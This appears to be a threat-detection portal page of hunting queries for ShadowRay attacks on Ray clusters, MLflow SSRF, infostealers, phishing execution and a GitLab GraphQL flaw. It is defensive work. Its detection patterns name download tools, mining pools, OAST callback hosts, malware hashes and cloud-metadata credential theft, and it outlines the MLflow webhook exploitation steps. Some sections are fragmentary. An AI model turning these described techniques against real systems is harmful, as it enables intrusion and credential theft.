Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Ray host OOB callback to oast.fun/interact.sh (ShadowRay exploit validation) · [LLM] One host fanning out to multiple internal Ray dashboards (8265/10001) · Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Ray raylet/python spawning shell + ingress tooling (ShadowRay payload execution) · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Ray node beaconing to ShadowRay C2 / Monero-Zano mining pools · Infostealer — non-browser process accessing browser cookie/login DBs
Ray host OOB callback to oast.fun/interact.sh (ShadowRay exploit validation) AIExploitation High
Hunts a Ray/Python server process resolving an interact.sh (oast.fun) out-of-band interaction domain — the exact technique ShadowRay 2.0 uses to fingerprint exploitable unauthenticated /api/jobs dashboards before dropping payloads. A production Ray node has no legitimate reason to beacon to an OAST domain. Rationale: Anchors on the article/Oligo-confirmed OOB discovery step: interact.sh (oast.fun) callbacks (incl. the specific bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun host) initiated by Ray processes. Cross-checked Oligo ShadowRay 2.0 write-up and THN Nov-2025 coverage which both cite oast.fun for pre-exploit dashboard fingerprinting. Cross-checked against: • https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet • https://thehackernews.com/2025/11/shadowray-20-exploits-unpatched-ray.html • https://www.bleepingcomputer.com/news/security/new-shadowray-attacks-convert-ray-clusters-into-crypto-miners/
ATT&CKT1190 T1189
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security team running their own interact.sh/Burp Collaborator OAST tests against the Ray dashboard
  • Bug-bounty / pentest engagement fingerprinting internal Ray instances
  • A developer copy-pasting a PoC that beacons to a benign OAST domain
  • DNS logging appliance replaying cached OAST lookups
Response runbook
1) Triage: identify the Ray host and the initiating process/cmdline; confirm the OAST FQDN is not from an authorized pentest and that the host runs Ray < 2.52.0 (check DeviceTvmSoftwareInventory). 2) Contain: isolate the node from egress, block *.oast.fun/*.interact.sh at the proxy, and restrict the Ray dashboard (8265) to loopback/VPN. 3) Hunt: pivot on the same host for raylet/python spawning sh/bash/curl (UC2) and for outbound mining-pool traffic (UC3) within the following hours.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl has "oast.fun" or RemoteUrl has "interact.sh" or RemoteUrl has "bwqqvqfgsseplyoltois92rdukv0mm5th"
| where InitiatingProcessFileName in~ ("python","python3","raylet","ray","gcs_server","sh","bash","curl","wget")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP
| order by Timestamp desc
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestURL has_any ("/api/jobs", "/api/job_agent/jobs")
| where RequestMethod in~ ("POST","PUT") or DestinationPort in (8265, 10001)
| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication
| order by TimeGenerated desc

Ray raylet/python spawning shell + ingress tooling (ShadowRay payload execution) AIInstallation High
Detects a Ray worker (raylet/gcs_server/python) spawning a shell or download utility with cryptominer/staging indicators — the post-exploitation step after an unauthenticated /api/jobs submission runs attacker shell code. Also matches the known ShadowRay payload hashes if the dropped binary is observed. Rationale: Uses the Oligo-documented parent chain (raylet/python job workers) spawning sh/bash/curl/wget/chmod/xmrig plus the article's staging indicators and the four provided payload hashes (SHA256 6f4452…, 1f6c69…; SHA1 779a8a…; MD5 1f63fa…). Parent-child pairing keeps FPs off legit Ray Python subprocesses. Cross-checked against: • https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet • https://www.darkreading.com/cyber-risk/shadowray-20-ai-clusters-crypto-botnets
ATT&CKT1203 T1059.004 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Ray jobs that shell out to curl/wget to pull datasets or model weights
  • ML pipeline steps using chmod +x on helper scripts in /tmp
  • Data-science notebooks launched under the ray user invoking bash
  • Ops automation (Ansible/CI) running under python that fetches artifacts
Suppression filter
| where not (ProcessCommandLine has_any ("artifacts.internal", "models/", "datasets/") and not ProcessCommandLine has_any ("xmrig","supportxmr","moneroocean","k1pool","/tmp/"))
Response runbook
1) Triage: read the full child command line — confirm the URL/host being fetched and whether it references a mining pool, /tmp drop, or the known hashes; check if it followed an /api/jobs POST (UC1). 2) Contain: kill the process tree, quarantine the dropped binary, isolate the node, and revoke any AWS instance-role creds exposed to the workload. 3) Hunt: sweep all Ray cluster nodes for the same hashes and for outbound mining-pool traffic (UC3), and check for self-propagation to peer nodes (UC4).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("raylet","gcs_server","python","python3","ray")
| where FileName in~ ("sh","bash","dash","curl","wget","chmod","xmrig","perl")
| where ProcessCommandLine has_any ("curl","wget","http://","https://","chmod +x","xmrig","supportxmr","moneroocean","k1pool","/tmp/")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256, SHA1, MD5
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("raylet","gcs_server","python","ray")
| where ActingProcessName has_any ("sh","bash","dash","curl","wget","chmod","xmrig")
| where ActingProcessCommandLine has_any ("curl","wget","chmod +x","xmrig","supportxmr","moneroocean","k1pool","/tmp/")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, SHA256
| order by TimeGenerated desc

Ray node beaconing to ShadowRay C2 / Monero-Zano mining pools AIActions on Objectives Medium
Detects Ray/GPU hosts connecting to the ShadowRay 2.0 attacker C2 IPs or to the supportxmr/moneroocean/k1pool mining pools — the resource-hijacking end state where compromised NVIDIA GPU clusters mine Monero/Zano. Pure IOC-match, high fidelity. Rationale: Direct IOC match on the 13 ShadowRay C2 IPs and the three mining pools (pool.supportxmr.com, gulf.moneroocean.stream, eu.zano.k1pool.com) enumerated in the article and confirmed by Oligo/BleepingComputer. VPC flow variant included because several C2 IPs (18.228.x/18.230.x) are AWS-hosted and many Ray GPU clusters run on EC2. Cross-checked against: • https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet • https://www.bleepingcomputer.com/news/security/new-shadowray-attacks-convert-ray-clusters-into-crypto-miners/ • https://threats.wiz.io/all-incidents/cryptomining-campaign-exploiting-exposed-ray-ai-infrastructure
ATT&CKT1496 T1071.001
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate researcher testing mining-pool connectivity in a sandbox
  • Threat-intel enrichment/proxy appliance actively probing the IOC IPs
  • Stale IOC — one of the IPs later re-assigned to a benign AWS tenant
  • A GPU benchmarking tool that happens to reach a pool domain
Response runbook
1) Triage: confirm the source is a Ray/GPU node and correlate with sustained ~100% GPU utilization and the xmrig process (UC2). 2) Contain: null-route/block the C2 IPs and pool domains at egress, isolate the node, and snapshot for forensics before rebuild. 3) Hunt: expand to every node in the cluster and to network-adjacent Ray instances (UC4); rotate any credentials/keys accessible from the compromised workloads and confirm patch to Ray 2.52.0.

| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort

One host fanning out to multiple internal Ray dashboards (8265/10001) AIExploitation Medium
Detects a single workstation or host making connections to multiple internal Ray dashboard/client ports (8265/10001) — the confused-deputy lateral spread where a compromised browser or node pivots to network-adjacent Ray clusters behind the perimeter. Threshold-based, cross-host fan-out shape. Rationale: Targets the article's confused-deputy lateral pivot ("attack network-adjacent instances of Ray") via the Ray dashboard (8265) and client (10001) ports on private space, using a fan-out count rather than a single IOC so it catches self-propagation even to unknown internal clusters. Port 8265 as the default Ray dashboard confirmed by Oligo/eSecurityPlanet. Cross-checked against: • https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet • https://www.esecurityplanet.com/threats/shadowray-2-0-exploits-ray-vulnerability-to-hijack-ai-clusters/
ATT&CKT1210
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A legitimate Ray head node or job scheduler orchestrating many worker dashboards
  • Cluster monitoring/health-check tooling polling all node dashboards
  • An SRE running a fleet-wide Ray status script
  • CI/CD deployment pipeline touching multiple Ray endpoints
Suppression filter
| where InitiatingProcessFileName !in~ ("ray","raylet","gcs_server","prometheus","grafana-server","telegraf")
Response runbook
1) Triage: is the fan-out source an expected Ray head/monitoring host, or an unexpected workstation/browser host? Check whether the source also shows the oast.fun callback (UC1) or shell spawns (UC2). 2) Contain: segment the Ray dashboard ports (8265/10001) to management VLAN only and block the source host's east-west access pending review. 3) Hunt: on each reached Ray node, look for /api/jobs submissions, payload hashes, and mining-pool egress (UC3) to gauge spread.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemotePort in (8265, 10001)
| where RemoteIPType == "Private"
| summarize DistinctTargets = dcount(RemoteIP), Targets = make_set(RemoteIP, 50), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName, InitiatingProcessFileName
| where DistinctTargets >= 3   // one host reaching 3+ internal Ray dashboards = fan-out
| order by DistinctTargets desc
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstPortNumber in (8265, 10001)
| where ipv4_is_private(DstIpAddr)
| summarize DistinctTargets = dcount(DstIpAddr), Targets = make_set(DstIpAddr, 50), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by SrcIpAddr, DvcHostname
| where DistinctTargets >= 3   // fan-out to 3+ internal Ray clusters
| order by DistinctTargets desc

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    [| tstats summariesonly=false earliest(_time) AS exec_time

Email attachment opened from external sender Delivery High

Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")

| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"

   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063", "1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b", "779a8af3b9838a33d1e199da3fc2f02a49e7c13e", "1f63fa7921c2f5fb8f8ffa430d02ac4a") or SHA1 in~ ("6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063", "1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b", "779a8af3b9838a33d1e199da3fc2f02a49e7c13e", "1f63fa7921c2f5fb8f8ffa430d02ac4a") or MD5 in~ ("6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063", "1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b", "779a8af3b9838a33d1e199da3fc2f02a49e7c13e", "1f63fa7921c2f5fb8f8ffa430d02ac4a")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063", "1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b", "779a8af3b9838a33d1e199da3fc2f02a49e7c13e", "1f63fa7921c2f5fb8f8ffa430d02ac4a") or SHA1 in~ ("6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063", "1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b", "779a8af3b9838a33d1e199da3fc2f02a49e7c13e", "1f63fa7921c2f5fb8f8ffa430d02ac4a") or MD5 in~ ("6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063", "1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b", "779a8af3b9838a33d1e199da3fc2f02a49e7c13e", "1f63fa7921c2f5fb8f8ffa430d02ac4a")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063", "1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b", "779a8af3b9838a33d1e199da3fc2f02a49e7c13e", "1f63fa7921c2f5fb8f8ffa430d02ac4a"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.

MLflow unauthenticated webhook create + /test SSRF exploitation (CVE-2026-64849) AIExploitation High
Hunts the CVE-2026-64849 exploitation sequence against a default MLflow Tracking Server: an unauthenticated caller POSTs to /api/2.0/mlflow/webhooks to register an attacker-controlled HTTPS URL, then invokes POST /api/2.0/mlflow/webhooks/{id}/test to trigger a redirect-follow SSRF and read the reflected internal response. Detects the same source IP touching both the webhook-create and webhook /test endpoints. Rationale: Uses the exact vulnerable endpoints from the advisory PoC (/api/2.0/mlflow/webhooks and /api/2.0/mlflow/webhooks/{id}/test); the create+test pair from one source is the unauthenticated exploitation shape. Corroborated against GitLab advisory and MLflow PR #24258 fix. Cross-checked against: • https://advisories.gitlab.com/pypi/mlflow/CVE-2026-64849/ • https://github.com/mlflow/mlflow/pull/24258 • https://mlflow.org/docs/latest/self-hosting/webhooks/
ATT&CKT1190
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate MLflow admin testing a newly-configured webhook integration (e.g. Slack/CI notifier) via the UI
  • Automated MLflow integration test suites exercising the webhooks API in staging
  • Vulnerability scanners (Nessus/Qualys) probing the endpoint during authorized assessments
  • Internal platform team registering a genuine model-registry webhook then validating it
Suppression filter
| where SourceIP !in ("10.0.0.0/8 known-admin-jumpbox-IPs")   // replace with your MLflow admin CIDR/jumpbox once identified
Response runbook
1) Triage: pull all requests from the SourceIP to /api/2.0/mlflow/webhooks*; extract the registered webhook URL from the create body and check whether the /test response body (if logged) contains internal data. Confirm the server is <3.15.0 and running with no auth. 2) Contain: block the SourceIP at the WAF, delete rogue webhooks via the API/DB, and put the tracking server behind authentication or a network ACL; upgrade MLflow to >=3.15.0. 3) Hunt: pivot to UC2 to see if the mlflow/python process egressed to 169.254.169.254 or loopback, and to UC3 for downstream use of any stolen instance-role credentials.
let Window = 1h;
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestURL has "/api/2.0/mlflow/webhooks"
| extend IsTest = RequestURL matches regex @"/api/2\.0/mlflow/webhooks/[^/]+/test"
| summarize CreateHits = countif(RequestMethod == "POST" and not(IsTest)),
            TestHits   = countif(IsTest),
            URLs       = make_set(RequestURL, 20),
            FirstSeen  = min(TimeGenerated), LastSeen = max(TimeGenerated)
        by SourceIP, DestinationHostName, DeviceProduct
| where CreateHits > 0 and TestHits > 0
| order by LastSeen desc

references:

  - https://advisories.gitlab.com/pypi/mlflow/CVE-2026-64849/

MLflow/Python server egress to cloud metadata IP 169.254.169.254 (SSRF landing) AIExploitation Medium
Hunts the server-side landing of the CVE-2026-64849 SSRF: the MLflow tracking-server process (python/gunicorn/uvicorn) opening an outbound connection to the link-local cloud-metadata address 169.254.169.254 or to loopback, driven by webhook redirect-follow. A web-facing model server reaching IMDS to read iam/security-credentials is high-signal credential theft. Rationale: 169.254.169.254 and the /latest/meta-data/iam/security-credentials/ path are the exact SSRF targets in the advisory PoC; scoping the initiating process to python/gunicorn (MLflow's runtime) separates it from routine SDK IMDS chatter. Loopback (127.*) egress covers the http://127.0.0.1 variant. Cross-checked against: • https://github.com/advisories/GHSA-7gwp-5pfp-969j • https://advisories.gitlab.com/pypi/mlflow/CVE-2026-64849/
ATT&CKT1552.005 T1190
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate boto3/AWS SDK calls from the same MLflow python process using an instance profile (IRSA/instance role) to reach IMDS
  • MLflow artifact store configured on S3 fetching temporary credentials via IMDS at startup
  • IMDSv2 token PUT requests to 169.254.169.254/latest/api/token from normal SDK usage
  • Health/monitoring agents co-located in the same python venv polling metadata
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("boto3","aws","s3") and RemoteUrl has "/latest/api/token")
Response runbook
1) Triage: confirm the timestamp of the 169.254.169.254 connection correlates with a UC1 webhook /test request from an external IP; inspect the process command line to confirm it is the mlflow server, not a legitimate boto3 workflow. 2) Contain: rotate/revoke the instance-role credentials that IMDS would have returned, enforce IMDSv2 hop-limit=1, and isolate/patch the host (MLflow >=3.15.0). 3) Hunt: search CloudTrail for the leaked role session being used from an unfamiliar IP (UC3), and review all internal hosts the server may have port-scanned via subsequent webhook redirects.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has_any ("python","python3","gunicorn","uvicorn","mlflow")
| where RemoteIP == "169.254.169.254" or RemoteIP startswith "127."
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine,
          RemoteIP, RemotePort, RemoteUrl, InitiatingProcessAccountName
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr == "169.254.169.254" or DstIpAddr startswith "127."
| where NetworkApplicationProtocol has "http" or DstPortNumber in (80, 8080, 5000)
| project TimeGenerated, DvcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, Url, EventProduct
| order by TimeGenerated desc

Critical GitLab GraphQL Flaw Could Let Unauthenticated Attackers Delete Public Projects

The Hacker News
2026-08-17 6 use cases 3 techniques 6 kill-chain phases detected

GitLab has released security updates to address a critical vulnerability impacting its Community Edition (CE) and Enterprise Edition (EE) software that, under certain conditions, could allow an unauthenticated attacker to remotely modify or delete public projects and user data. The flaw, tracked as CVE-2026-19478, has been rated Critical by GitLab and assigned a CVSS score of 9.4. Released on

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] Self-managed GitLab running versions vulnerable to CVE-2026-19478 / CVE-2026-19650 · Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] GitLab GraphQL mutation delivered over HTTP GET to /api/graphql (CVE-2026-19650) · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.

GitLab GraphQL mutation delivered over HTTP GET to /api/graphql (CVE-2026-19650) AIExploitation Medium
Hunts HTTP GET requests to GitLab's /api/graphql endpoint whose query string carries a GraphQL 'mutation' operation or a multiplex '_json' batch. GraphQL reads are valid over GET, but mutations over GET are the exact improper-request-validation vector GitLab patched in CVE-2026-19650 (and a plausible delivery path for the CVE-2026-19478 unauthenticated modify/delete). Article-specific because it pins the GitLab GraphQL endpoint and the GET-mutation mechanism named in the advisory. Rationale: Uses the two hard facts the advisory gives: the GitLab GraphQL endpoint (/api/graphql) and the CVE-2026-19650 mechanic of executing mutations through GET requests via the multiplex query handler. Mutations-over-GET is inherently anomalous, keeping fidelity high without a published payload. Cross-checked against: • https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-2-4-released/ • https://cyberpress.org/gitlab-critical-vulnerability/ • https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html
ATT&CKT1190 T1485
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate GraphiQL / IDE exploration where 'mutation' appears as a field or variable name inside a read-only query string
  • Authorized DAST / GitLab security scanners probing the GraphQL endpoint
  • API clients that URL-encode a query variable literally containing the word 'mutation'
  • GraphQL introspection queries (__schema) that some clients issue over GET
  • Load-balancer / uptime health checks hitting /api/graphql with canned queries
Suppression filter
